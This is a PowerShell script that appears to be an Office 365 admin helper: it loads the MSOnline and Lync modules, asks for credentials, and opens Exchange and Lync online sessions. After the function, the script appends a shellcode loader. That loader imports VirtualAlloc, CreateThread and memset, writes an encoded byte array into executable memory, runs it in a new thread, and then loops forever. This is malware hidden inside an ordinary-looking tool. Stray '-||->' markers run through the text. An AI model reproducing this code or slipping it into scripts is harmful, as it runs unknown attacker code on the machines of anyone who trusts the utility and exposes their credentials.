 -||-> function Connect-Office365
{

    [CmdletBinding()]
    PARAM (

    )
    BEGIN
    {
         -||-> TRY
        {
            
             -||-> IF ( -||-> -not ( -||-> Get-Module -Name MSOnline -ListAvailable <-||- ) <-||- )
            {
                 -||-> Write-Verbose -Message "BEGIN - Import module Azure Active Directory" <-||- 
                 -||-> Import-Module -Name MSOnline -ErrorAction Stop -ErrorVariable ErrorBeginIpmoMSOnline <-||- 
            } <-||- 

             -||-> IF ( -||-> -not ( -||-> Get-Module -Name LyncOnlineConnector -ListAvailable <-||- ) <-||- )
            {
                 -||-> Write-Verbose -Message "BEGIN - Import module Lync Online" <-||- 
                 -||-> Import-Module -Name LyncOnlineConnector -ErrorAction Stop -ErrorVariable ErrorBeginIpmoLyncOnline <-||- 
            } <-||- 
        }
        CATCH
        {
             -||-> Write-Warning -Message "BEGIN - Something went wrong!" <-||- 
             -||-> IF ( -||-> $ErrorBeginIpmoMSOnline <-||- )
            {
                 -||-> Write-Warning -Message "BEGIN - Error while importing MSOnline module" <-||- 
            } <-||- 
             -||-> IF ( -||-> $ErrorBeginIpmoLyncOnline <-||- )
            {
                 -||-> Write-Warning -Message "BEGIN - Error while importing LyncOnlineConnector module" <-||- 
            } <-||- 

             -||-> Write-Warning -Message $error[0].exception.message <-||- 
        } <-||- 
    }
    PROCESS
    {
         -||-> TRY
        {

            
             -||-> Write-Verbose -Message "PROCESS - Ask for Office365 Credential" <-||- 
             -||-> $Credential =  -||-> Get-Credential -ErrorAction continue -ErrorVariable ErrorCredential -Credential "$env:USERNAME@$env:USERDNSDOMAIN" <-||-  <-||- 


            
             -||-> Write-Verbose -Message "PROCESS - Connect to Azure Active Directory" <-||- 
             -||-> Connect-MsolService -Credential $Credential <-||- 

            
             -||-> Write-Verbose -Message "PROCESS - Create session to Exchange online" <-||- 
             -||-> $ExchangeURL = "https://ps.outlook.com/powershell/" <-||- 
             -||-> $O365PS =  -||-> New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri $ExchangeURL -Credential $Credential -Authentication Basic -AllowRedirection -ErrorAction Stop -ErrorVariable ErrorConnectExchange <-||-  <-||- 

             -||-> Write-Verbose -Message "PROCESS - Open session to Exchange online (Prefix: Cloud)" <-||- 
             -||-> Import-PSSession -Session $O365PS –Prefix ExchCloud <-||- 

            
             -||-> Write-Verbose -Message "PROCESS - Create session to Lync online" <-||- 
             -||-> $LyncSession =  -||-> New-CsOnlineSession –Credential $Credential -ErrorAction Stop -ErrorVariable ErrorConnectExchange <-||-  <-||- 
             -||-> Import-PSSession -Session $LyncSession -Prefix LyncCloud <-||- 

            
            
        }
        CATCH
        {
             -||-> Write-Warning -Message "PROCESS - Something went wrong!" <-||- 
             -||-> IF ( -||-> $ErrorCredential <-||- )
            {
                 -||-> Write-Warning -Message "PROCESS - Error while gathering credential" <-||- 
            } <-||- 
             -||-> IF ( -||-> $ErrorConnectMSOL <-||- )
            {
                 -||-> Write-Warning -Message "PROCESS - Error while connecting to Azure AD" <-||- 
            } <-||- 
             -||-> IF ( -||-> $ErrorConnectExchange <-||- )
            {
                 -||-> Write-Warning -Message "PROCESS - Error while connecting to Exchange Online" <-||- 
            } <-||- 
             -||-> IF ( -||-> $ErrorConnectLync <-||- )
            {
                 -||-> Write-Warning -Message "PROCESS - Error while connecting to Lync Online" <-||- 
            } <-||- 

             -||-> Write-Warning -Message $error[0].exception.message <-||- 
        } <-||- 
    }
} <-||- 

 -||-> $c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xbb,0x83,0xb1,0xb7,0x64,0xdb,0xd2,0xd9,0x74,0x24,0xf4,0x5a,0x33,0xc9,0xb1,0x47,0x83,0xc2,0x04,0x31,0x5a,0x0f,0x03,0x5a,0x8c,0x53,0x42,0x98,0x7a,0x11,0xad,0x61,0x7a,0x76,0x27,0x84,0x4b,0xb6,0x53,0xcc,0xfb,0x06,0x17,0x80,0xf7,0xed,0x75,0x31,0x8c,0x80,0x51,0x36,0x25,0x2e,0x84,0x79,0xb6,0x03,0xf4,0x18,0x34,0x5e,0x29,0xfb,0x05,0x91,0x3c,0xfa,0x42,0xcc,0xcd,0xae,0x1b,0x9a,0x60,0x5f,0x28,0xd6,0xb8,0xd4,0x62,0xf6,0xb8,0x09,0x32,0xf9,0xe9,0x9f,0x49,0xa0,0x29,0x21,0x9e,0xd8,0x63,0x39,0xc3,0xe5,0x3a,0xb2,0x37,0x91,0xbc,0x12,0x06,0x5a,0x12,0x5b,0xa7,0xa9,0x6a,0x9b,0x0f,0x52,0x19,0xd5,0x6c,0xef,0x1a,0x22,0x0f,0x2b,0xae,0xb1,0xb7,0xb8,0x08,0x1e,0x46,0x6c,0xce,0xd5,0x44,0xd9,0x84,0xb2,0x48,0xdc,0x49,0xc9,0x74,0x55,0x6c,0x1e,0xfd,0x2d,0x4b,0xba,0xa6,0xf6,0xf2,0x9b,0x02,0x58,0x0a,0xfb,0xed,0x05,0xae,0x77,0x03,0x51,0xc3,0xd5,0x4b,0x96,0xee,0xe5,0x8b,0xb0,0x79,0x95,0xb9,0x1f,0xd2,0x31,0xf1,0xe8,0xfc,0xc6,0xf6,0xc2,0xb9,0x59,0x09,0xed,0xb9,0x70,0xcd,0xb9,0xe9,0xea,0xe4,0xc1,0x61,0xeb,0x09,0x14,0x1f,0xee,0x9d,0x29,0x60,0x3a,0xcb,0x3e,0x63,0xbb,0xec,0x4b,0xea,0x5d,0x42,0xe4,0xbd,0xf1,0x22,0x54,0x7e,0xa2,0xca,0xbe,0x71,0x9d,0xea,0xc0,0x5b,0xb6,0x80,0x2e,0x32,0xee,0x3c,0xd6,0x1f,0x64,0xdd,0x17,0x8a,0x00,0xdd,0x9c,0x39,0xf4,0x93,0x54,0x37,0xe6,0x43,0x95,0x02,0x54,0xc5,0xaa,0xb8,0xf3,0xe9,0x3e,0x47,0x52,0xbe,0xd6,0x45,0x83,0x88,0x78,0xb5,0xe6,0x83,0xb1,0x23,0x49,0xfb,0xbd,0xa3,0x49,0xfb,0xeb,0xa9,0x49,0x93,0x4b,0x8a,0x19,0x86,0x93,0x07,0x0e,0x1b,0x06,0xa8,0x67,0xc8,0x81,0xc0,0x85,0x37,0xe5,0x4e,0x75,0x12,0xf7,0xb3,0xa0,0x5a,0x8d,0xdd,0x70 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $x=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $x.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$x,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



